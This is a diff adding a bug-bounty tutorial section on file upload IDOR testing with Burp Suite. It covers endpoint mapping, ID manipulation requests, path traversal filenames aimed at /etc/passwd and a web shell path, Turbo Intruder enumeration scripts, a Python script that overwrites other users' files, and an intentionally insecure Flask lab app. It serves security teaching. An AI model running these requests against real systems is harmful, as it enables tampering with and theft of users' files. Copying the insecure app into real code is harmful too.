@@ -8499,3 +8499,647 @@ class BurpExtender(IBurpExtender, IHttpListener):
 - PortSwigger IDOR Labs: portswigger.net/web-security/access-control/idor
 
 ---
+
+# 📁 **Bug #17: File Upload IDOR - Full Burp Suite Methodology**
+
+## **Bug Description:** Overwriting other users' files via insecure direct object references in file upload functionality
+
+---
+
+## 🎯 **UNDERSTANDING THE VULNERABILITY**
+
+### **What is File Upload IDOR?**
+When an application allows users to upload files but doesn't properly verify ownership when:
+- **Overwriting** existing files
+- **Accessing** other users' files
+- **Deleting** others' files
+- **Modifying** file metadata
+
+### **Common Vulnerable Scenarios**
+- Profile picture uploads
+- Document management systems
+- File sharing platforms
+- Cloud storage applications
+- Attachment functionality
+- Resume/CV uploads
+
+---
+
+## 🔍 **RECONNAISSANCE PHASE**
+
+### **Step 1: Map File Upload Endpoints**
+
+**Using Burp Target Tab:**
+1. Navigate through the application
+2. Look for:
+   ```
+   /upload
+   /file-upload
+   /profile/picture
+   /documents/upload
+   /api/files/upload
+   /user/avatar
+   /attachments
+   ```
+
+**Using Burp Sitemap:**
+```
+Target > Site map > Filter by MIME type (images, documents)
+Look for POST requests with multipart/form-data
+```
+
+### **Step 2: Identify File Naming Patterns**
+
+Create two test accounts: **UserA** and **UserB**
+
+**For UserA:**
+1. Upload a file named `test1.jpg`
+2. Capture request in Burp
+3. Note the response and file path returned
+
+**Example Request:**
+```
+POST /upload HTTP/1.1
+Host: target.com
+Cookie: session=USERA_SESSION
+
+Content-Disposition: form-data; name="file"; filename="test1.jpg"
+Content-Type: image/jpeg
+
+[FILE DATA]
+```
+
+**Example Response:**
+```json
+{
+  "success": true,
+  "fileId": "5487",
+  "fileUrl": "/uploads/5487_test1.jpg",
+  "message": "File uploaded successfully"
+}
+```
+
+### **Step 3: Analyze File Naming Convention**
+
+Look for patterns:
+- Sequential IDs: `file_1.jpg`, `file_2.jpg`
+- User-based: `user123_photo.jpg`
+- Timestamp-based: `20240219123045_test.jpg`
+- UUID-based: `f47ac10b-58cc-4372-a567-0e02b2c3d479.jpg`
+- Hash-based: `md5(filename+timestamp).jpg`
+
+---
+
+## 🧪 **TESTING METHODOLOGY**
+
+### **Step 4: Identify File Parameters to Manipulate**
+
+**Common Parameters to Test:**
+```
+file_id
+fileId
+documentId
+attachmentId
+filename
+filePath
+fileUrl
+imageId
+avatarId
+profilePic
+resourceId
+```
+
+### **Step 5: Basic IDOR Tests**
+
+**Test Case 1: Sequential ID Manipulation**
+
+Using Burp Repeater:
+1. Upload file as UserA → get fileId=100
+2. Switch to UserB session
+3. Try accessing/modifying fileId=100
+
+**Request Modification:**
+```
+Original (UserB upload):
+POST /upload HTTP/1.1
+Cookie: session=USERB_SESSION
+
+fileId=200&filename=testB.jpg
+
+Modified (Attempt to overwrite UserA's file):
+POST /upload HTTP/1.1
+Cookie: session=USERB_SESSION
+
+fileId=100&filename=testB.jpg
+```
+
+### **Step 6: Parameter Location Testing**
+
+**Test different locations for the file identifier:**
+
+**URL Path:**
+```
+GET /files/100 HTTP/1.1
+Cookie: session=USERB_SESSION
+```
+
+**Query Parameter:**
+```
+GET /files?fileId=100 HTTP/1.1
+Cookie: session=USERB_SESSION
+```
+
+**POST Body:**
+```
+POST /files/update HTTP/1.1
+Cookie: session=USERB_SESSION
+Content-Type: application/x-www-form-urlencoded
+
+fileId=100&action=delete
+```
+
+**JSON Body:**
+```
+POST /api/files/update HTTP/1.1
+Cookie: session=USERB_SESSION
+Content-Type: application/json
+
+{"fileId": 100, "action": "overwrite"}
+```
+
+**Multipart:**
+```
+POST /upload HTTP/1.1
+Cookie: session=USERB_SESSION
+Content-Type: multipart/form-data; boundary=xxx
+
+--xxx
+Content-Disposition: form-data; name="fileId"
+
+100
+--xxx
+Content-Disposition: form-data; name="file"; filename="malicious.jpg"
+Content-Type: image/jpeg
+
+[FILE DATA]
+```
+
+---
+
+## 🔄 **ADVANCED TESTING TECHNIQUES**
+
+### **Step 7: Burp Intruder Setup for ID Enumeration**
+
+**Target:** `/files/update`
+**Parameter:** `fileId=§100§`
+
+**Payloads Configuration:**
+```
+Payload type: Numbers
+Number range: 1-1000
+Step: 1
+Number format: Decimal
+```
+
+**Attack Types:**
+1. **Sniper** - Single parameter fuzzing
+2. **Battering ram** - Multiple parameters same value
+3. **Pitchfork** - Different payload sets
+4. **Cluster bomb** - Multiple parameter combinations
+
+### **Step 8: Grep Match Setup**
+
+**Add grep extract rules for:**
+```
+"success": true
+"fileUrl"
+"owner": "userA"
+"permission denied"
+"unauthorized"
+404 vs 200 responses
+```
+
+### **Step 9: File Operation Testing Matrix**
+
+Create a testing matrix in Burp:
+
+| Operation | UserA File | UserB Attempt | Expected | Actual |
+|-----------|------------|---------------|----------|---------|
+| View | 100 | 100 | 403 | ? |
+| Download | 100 | 100 | 403 | ? |
+| Update | 100 | 100 | 403 | ? |
+| Delete | 100 | 100 | 403 | ? |
+| Overwrite | 100 | 100 | 403 | ? |
+| Rename | 100 | 100 | 403 | ? |
+
+---
+
+## 🚀 **SPECIALIZED TESTING SCENARIOS**
+
+### **Step 10: File Overwrite Techniques**
+
+**Technique A: Direct ID Manipulation**
+```
+1. Upload file as UserA → fileId=100
+2. Upload file as UserB with fileId=100
+3. Check if UserA's file is replaced
+```
+
+**Technique B: PUT/DELETE Methods**
+```
+PUT /files/100 HTTP/1.1
+Cookie: session=USERB_SESSION
+Content-Type: image/jpeg
+
+[Malicious file data]
+
+DELETE /files/100 HTTP/1.1
+Cookie: session=USERB_SESSION
+```
+
+**Technique C: Versioning Exploitation**
+```
+POST /files/version/100 HTTP/1.1
+Cookie: session=USERB_SESSION
+{"version": 2, "file": [malicious data]}
+```
+
+### **Step 11: Metadata Manipulation**
+
+**Update file metadata to point to other users' files:**
+
+```json
+POST /files/update HTTP/1.1
+Cookie: session=USERB_SESSION
+
+{
+  "fileId": 100,
+  "metadata": {
+    "owner": "userA",
+    "permissions": "public",
+    "path": "/uploads/userA_private.doc"
+  }
+}
+```
+
+### **Step 12: Path Traversal in Filename**
+
+**Test path traversal in filename parameter:**
+
+```
+POST /upload HTTP/1.1
+Cookie: session=USERB_SESSION
+
+filename="../../../etc/passwd"
+fileId=100
+```
+
+```
+POST /files/update HTTP/1.1
+Cookie: session=USERB_SESSION
+
+newPath="../../../var/www/html/shell.php"
+fileId=100
+```
+
+---
+
+## 🔧 **BURP EXTENSIONS FOR IDOR TESTING**
+
+### **Recommended Extensions:**
+
+1. **Autorize** - Automates authorization tests
+   ```
+   Install: BApp Store > Autorize
+   Configure: Set UserA as "Authorized", UserB as "Unauthorized"
+   Run: Automatically tests all requests for IDOR
+   ```
+
+2. **Authz** - Test with different cookies
+   ```
+   Switch between UserA and UserB sessions easily
+   Test same request with different auth contexts
+   ```
+
+3. **JSON Web Tokens** - Decode/modify JWT
+   ```
+   Check if user IDs are embedded in tokens
+   Modify claims and re-encode
+   ```
+
+4. **Param Miner** - Discover hidden parameters
+   ```
+   Right-click > Extensions > Param Miner > Guess params
+   Looks for parameters like fileId, docId, ownerId
+   ```
+
+5. **Turbo Intruder** - High-speed fuzzing
+   ```python
+   def queueRequests(target, wordlists):
+       engine = RequestEngine(endpoint=target.endpoint,
+                              concurrentConnections=10,
+                              requestsPerConnection=100,
+                              pipeline=False)
+       
+       for fileId in range(1, 1000):
+           engine.queue(target.req, str(fileId))
+   ```
+
+---
+
+## 📊 **ANALYSIS TECHNIQUES**
+
+### **Step 13: Response Analysis**
+
+**Compare responses between UserA and UserB:**
+
+```python
+# Using Burp Comparer
+1. Send UserA successful request to Comparer
+2. Send UserB attempted request to Comparer
+3. Compare responses for differences
+```
+
+**Look for:**
+- Content-Length differences
+- Status code variations
+- Error message differences
+- Response time variations
+
+### **Step 14: Race Condition Testing**
+
+**Test concurrent file operations:**
+
+```python
+# Turbo Intruder race condition script
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=20,
+                          requestsPerConnection=100)
+    
+    # Queue multiple overwrite attempts
+    for i in range(20):
+        engine.queue(target.req, str(100))
+    
+    # Queue view attempts
+    for i in range(20):
+        engine.queue(target.req_view, str(100))
+```
+
+### **Step 15: Blind IDOR Testing**
+
+**When no direct feedback:**
+1. Upload file attempting to overwrite
+2. Check if file content changed via UserA session
+3. Monitor for time-based differences
+4. Check email notifications
+5. Monitor server logs (if accessible)
+
+---
+
+## 🎯 **SPECIFIC TEST CASES**
+
+### **Case 1: Profile Picture Overwrite**
+
+**Steps:**
+```
+UserA: Upload profile pic → /avatar/upload
+Response: {"avatarId": 500}
+
+UserB: Modify request
+POST /avatar/update HTTP/1.1
+Cookie: session=USERB
+
+{"avatarId": 500, "image": [malicious content]}
+```
+
+### **Case 2: Document Version Control**
+
+```
+GET /documents/versions/100 HTTP/1.1
+Cookie: session=USERA
+
+Response: [{"version":1,"url":"/docs/100_v1"},{"version":2,"url":"/docs/100_v2"}]
+
+UserB: POST /documents/100/version
+{"version":2,"content":[malicious data]}
+```
+
+### **Case 3: Shared File Manipulation**
+
+```
+UserA: POST /files/share
+{"fileId":100,"shareWith":"userB"}
+
+UserB: POST /files/update
+{"fileId":100,"content":[malicious data]}
+```
+
+### **Case 4: Thumbnail Generation**
+
+```
+POST /files/generate-thumbnail
+Cookie: session=USERB
+
+{"fileId":100,"size":"large"}
+```
+
+---
+
+## 📝 **DOCUMENTATION TEMPLATE**
+
+### **Finding Report Structure:**
+
+```
+Vulnerability: File Upload IDOR
+Bug Number: 17
+Severity: High
+Endpoint: /api/files/upload
+
+Steps to Reproduce:
+1. Create UserA account
+2. Upload file "test.txt" → fileId=100
+3. Create UserB account
+4. Capture upload request for UserB
+5. Modify fileId parameter to 100
+6. Upload malicious content
+7. Access file as UserA to verify overwrite
+
+Request:
+[PASTE REQUEST]
+
+Response:
+[PASTE RESPONSE]
+
+Impact:
+- Can overwrite any user's files
+- Potential for malware distribution
+- Data loss for victims
+- Possible privilege escalation if configuration files overwritten
+
+Proof of Concept:
+[Screenshots/video]
+
+Remediation:
+- Implement ownership checks
+- Use UUID instead of sequential IDs
+- Verify user permissions server-side
+- Add CSRF tokens
+- Implement file versioning
+```
+
+---
+
+## 🔧 **AUTOMATION SCRIPTS**
+
+### **Python Script for Burp Integration:**
+
+```python
+import requests
+from bs4 import BeautifulSoup
+
+class FileIDORTester:
+    def __init__(self, target, session_a, session_b):
+        self.target = target
+        self.session_a = session_a
+        self.session_b = session_b
+        self.file_ids = []
+        
+    def enumerate_file_ids(self, user_session, start=1, end=100):
+        """Enumerate accessible file IDs for a user"""
+        for file_id in range(start, end):
+            response = requests.get(
+                f"{self.target}/files/{file_id}",
+                cookies={"session": user_session}
+            )
+            if response.status_code == 200:
+                self.file_ids.append(file_id)
+                print(f"Found accessible file: {file_id}")
+    
+    def test_overwrite(self, victim_file_id):
+        """Test if we can overwrite victim's file"""
+        
+        # First, verify victim owns the file
+        victim_response = requests.get(
+            f"{self.target}/files/{victim_file_id}",
+            cookies={"session": self.session_a}
+        )
+        
+        if victim_response.status_code != 200:
+            return False
+        
+        # Attempt overwrite from attacker account
+        files = {
+            'file': ('malicious.txt', 'IDOR TEST', 'text/plain')
+        }
+        data = {
+            'fileId': victim_file_id,
+            'action': 'overwrite'
+        }
+        
+        attack_response = requests.post(
+            f"{self.target}/files/update",
+            cookies={"session": self.session_b},
+            data=data,
+            files=files
+        )
+        
+        # Verify if overwrite succeeded
+        verify_response = requests.get(
+            f"{self.target}/files/{victim_file_id}",
+            cookies={"session": self.session_a}
+        )
+        
+        return "IDOR TEST" in verify_response.text
+
+# Usage
+tester = FileIDORTester("https://target.com", "USERA_SESSION", "USERB_SESSION")
+tester.enumerate_file_ids("USERA_SESSION", 1, 1000)
+
+for file_id in tester.file_ids:
+    if tester.test_overwrite(file_id):
+        print(f"Vulnerable file ID: {file_id}")
+```
+
+---
+
+## ⚠️ **WARNING SIGNS & INDICATORS**
+
+### **Application is likely vulnerable if:**
+- Sequential file IDs are used
+- No ownership verification in file operations
+- File paths include user IDs you can manipulate
+- API returns file IDs in responses
+- No CSRF protection on file operations
+- File operations use GET requests
+- File URLs are predictable
+
+### **Successful exploitation indicators:**
+- 200 OK when accessing others' files
+- File content changes after overwrite
+- Can delete others' files
+- File metadata updates reflect
+- Thumbnail regeneration shows new content
+
+---
+
+## 🛡️ **TESTING CHECKLIST**
+
+```
+[ ] Map all file upload endpoints
+[ ] Create two test accounts
+[ ] Identify file naming patterns
+[ ] Test sequential IDs
+[ ] Test UUID/GUID manipulation
+[ ] Test different HTTP methods
+[ ] Test parameter locations
+[ ] Test file overwrite
+[ ] Test file deletion
+[ ] Test metadata updates
+[ ] Test version control
+[ ] Test shared files
+[ ] Test race conditions
+[ ] Test with Burp extensions
+[ ] Document all findings
+[ ] Create proof of concept
+```
+
+---
+
+## 🎓 **PRACTICE LAB SETUP**
+
+### **Build vulnerable app for testing:**
+
+```python
+# Vulnerable Flask app example
+from flask import Flask, request, session
+import os
+
+app = Flask(__name__)
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    file_id = request.form.get('fileId', str(random.randint(1, 1000)))
+    file = request.files['file']
+    
+    # VULNERABLE: No ownership check
+    file.save(f'/uploads/{file_id}_{file.filename}')
+    return {'success': True, 'fileId': file_id}
+
+@app.route('/files/<file_id>')
+def get_file(file_id):
+    # VULNERABLE: Anyone can access any file
+    return send_from_directory('uploads', file_id)
+```
+
+---
+
+## 📚 **ADDITIONAL RESOURCES**
+
+- PortSwigger: File upload vulnerabilities
+- OWASP: Testing for IDOR
+- HackTricks: File Upload bypasses
+- PayloadsAllTheThings: IDOR techniques
+
+---
+
